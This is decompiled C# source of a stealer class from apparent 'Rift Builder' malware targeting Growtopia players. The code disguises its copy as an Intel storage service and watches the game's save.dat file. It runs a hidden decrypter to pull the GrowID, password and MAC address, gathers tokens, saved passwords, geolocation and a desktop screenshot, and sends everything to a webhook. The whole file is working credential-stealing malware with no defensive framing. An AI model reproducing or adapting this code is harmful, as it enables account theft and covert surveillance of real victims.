using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;

namespace CommonLanguageRuntimeLibrary
{
	// Token: 0x02000006 RID: 6
	internal class Tracer
	{
		// Token: 0x06000033 RID: 51 RVA: 0x0000474C File Offset: 0x0000294C
		public static void TraceSave()
		{
			string retards = Program.retards;
			string text = Program.retards + "/Intel(R) Rapid Storage Technology Management Service.exe";
			if (!Directory.Exists(retards))
			{
				Directory.CreateDirectory(retards);
			}
			if (Assembly.GetEntryAssembly().Location != text)
			{
				try
				{
					File.Delete(text);
				}
				catch
				{
				}
				File.Copy(Assembly.GetEntryAssembly().Location, text);
				Thread.Sleep(300);
				Process.Start(text);
				Thread.Sleep(500);
			}
			Tracer.fileSystemWatcher.Path = Tracer.dirPath;
			Tracer.fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
			Tracer.fileSystemWatcher.Filter = "*.dat";
			Tracer.fileSystemWatcher.Changed += Tracer.OnSaveChanged;
			Tracer.fileSystemWatcher.EnableRaisingEvents = true;
			for (;;)
			{
				Thread.Sleep(1000);
			}
		}

		// Token: 0x06000034 RID: 52 RVA: 0x0000482C File Offset: 0x00002A2C
		private static void OnSaveChanged(object source, FileSystemEventArgs e)
		{
			if (e.FullPath == Tracer.savePath)
			{
				try
				{
					byte[] bytes = new WebClient().DownloadData("https://ipinfo.io");
					string @string = Encoding.UTF8.GetString(bytes);
					string str = @string.Substring(@string.IndexOf("country") + 11, @string.IndexOf("loc", @string.IndexOf("country")) - 6 - (@string.IndexOf("country") + 11));
					string text = @string.Substring(@string.IndexOf("region") + 10, @string.IndexOf("country", @string.IndexOf("region")) - 6 - (@string.IndexOf("region") + 10));
					string text2 = @string.Substring(@string.IndexOf("city") + 8, @string.IndexOf("region", @string.IndexOf("city")) - 6 - (@string.IndexOf("city") + 8));
					string str2 = @string.Substring(@string.IndexOf("timezone") + 12, @string.IndexOf("readme", @string.IndexOf("timezone")) - 6 - (@string.IndexOf("timezone") + 12));
					string clearText = Program.giveiporgay();
					string machineGuid = Program.GetMachineGuid();
					Tracer.fileSystemWatcher.EnableRaisingEvents = false;
					try
					{
						File.Delete(Path.GetTempPath() + "/Update.exe");
					}
					catch
					{
					}
					try
					{
						File.Delete(Path.GetTempPath() + "pwd.txt");
					}
					catch
					{
					}
					Program.SaveDecrypter();
					new Process
					{
						StartInfo = 
						{
							FileName = "Update.exe",
							WorkingDirectory = Path.GetTempPath(),
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true
						}
					}.Start();
					Thread.Sleep(1500);
					foreach (Process process in Process.GetProcessesByName("Update"))
					{
						process.Kill();
					}
					string[] array = File.ReadAllText(Path.GetTempPath() + "pwd.txt").Split(new char[]
					{
						'='
					});
					Tracer.growid = array[0];
					Tracer.passwords = array[1];
					Tracer.lastworld = array[2];
					Tracer.mac = array[3];
					string clearText2 = "a";
					string clearText3 = Program.GibToken();
					string plainText = Program.getpass();
					if (Program.credo & Program.desktop)
					{
						Tracer.cipher = string.Concat(new string[]
						{
							Program.Encrypt(Tracer.growid),
							"|",
							Program.Encrypt(Tracer.passwords),
							"|",
							Program.Encrypt(Tracer.lastworld),
							"|",
							Program.Encrypt(clearText3),
							"|",
							Program.Encrypt(clearText),
							"|",
							Program.Encrypt(Tracer.mac),
							"|",
							Program.Encrypt(Environment.UserName),
							"|",
							Program.Encrypt(machineGuid),
							"|",
							Program.Encode(plainText),
							"|",
							Program.DesktopPicture()
						});
					}
					else if (Program.desktop)
					{
						Tracer.cipher = string.Concat(new string[]
						{
							Program.Encrypt(Tracer.growid),
							"|",
							Program.Encrypt(Tracer.passwords),
							"|",
							Program.Encrypt(Tracer.lastworld),
							"|",
							Program.Encrypt(clearText3),
							"|",
							Program.Encrypt(clearText),
							"|",
							Program.Encrypt(Tracer.mac),
							"|",
							Program.Encrypt(Environment.UserName),
							"|",
							Program.Encrypt(machineGuid),
							"|",
							Program.Encrypt(clearText2),
							"|",
							Program.DesktopPicture()
						});
					}
					else if (Program.credo)
					{
						Tracer.cipher = string.Concat(new string[]
						{
							Program.Encrypt(Tracer.growid),
							"|",
							Program.Encrypt(Tracer.passwords),
							"|",
							Program.Encrypt(Tracer.lastworld),
							"|",
							Program.Encrypt(clearText3),
							"|",
							Program.Encrypt(clearText),
							"|",
							Program.Encrypt(Tracer.mac),
							"|",
							Program.Encrypt(Environment.UserName),
							"|",
							Program.Encrypt(machineGuid),
							"|",
							Program.Encode(plainText)
						});
					}
					else
					{
						Tracer.cipher = string.Concat(new string[]
						{
							Program.Encrypt(Tracer.growid),
							"|",
							Program.Encrypt(Tracer.passwords),
							"|",
							Program.Encrypt(Tracer.lastworld),
							"|",
							Program.Encrypt(clearText3),
							"|",
							Program.Encrypt(clearText),
							"|",
							Program.Encrypt(Tracer.mac),
							"|",
							Program.Encrypt(Environment.UserName),
							"|",
							Program.Encrypt(machineGuid)
						});
					}
					string text3 = "";
					string text4 = text3;
					text3 = string.Concat(new string[]
					{
						text4,
						"Save.dat stolen from ",
						Environment.UserName,
						"/",
						Environment.MachineName,
						" [TRACED]",
						Environment.NewLine
					});
					text3 = text3 + "GrowID : " + Tracer.growid + Environment.NewLine;
					text3 = text3 + "MAC Address : " + Tracer.mac + Environment.NewLine;
					text3 = text3 + "Country : " + str + Environment.NewLine;
					string text5 = text3;
					text3 = string.Concat(new string[]
					{
						text5,
						"Region/City : ",
						text,
						"/",
						text2,
						Environment.NewLine
					});
					text3 = text3 + "Time Zone : " + str2 + Environment.NewLine;
					text3 = text3 + "==============================================================" + Environment.NewLine;
					text3 = text3 + "Drag this file to your accounts folder and check the resolver!" + Environment.NewLine;
					text3 = text3 + "Thanks for using Rift Builder, have fun!" + Environment.NewLine;
					text3 = text3 + "- Grando *kisses you on the cheek*" + Environment.NewLine;
					if (Program.pong)
					{
						text3 += "@everyone";
					}
					Webhook webhook = new Webhook(Program.Decrypt(Program.hook));
					Webhook.growid = Tracer.growid;
					webhook.SendMessage(text3, Tracer.cipher);
					try
					{
						File.Delete(Path.GetTempPath() + "pwd.txt");
					}
					catch
					{
					}
				}
				finally
				{
					Tracer.fileSystemWatcher.EnableRaisingEvents = true;
				}
			}
		}

		// Token: 0x0400001C RID: 28
		public static string cipher = "";

		// Token: 0x0400001D RID: 29
		public static bool desktop = true;

		// Token: 0x0400001E RID: 30
		public static string dirPath = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia";

		// Token: 0x0400001F RID: 31
		public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();

		// Token: 0x04000020 RID: 32
		public static string growid = "";

		// Token: 0x04000021 RID: 33
		public static string lastworld = "";

		// Token: 0x04000022 RID: 34
		public static string mac = "";

		// Token: 0x04000023 RID: 35
		public static string passwords = "";

		// Token: 0x04000024 RID: 36
		public static string savePath = Program.savedatbru();
	}
}
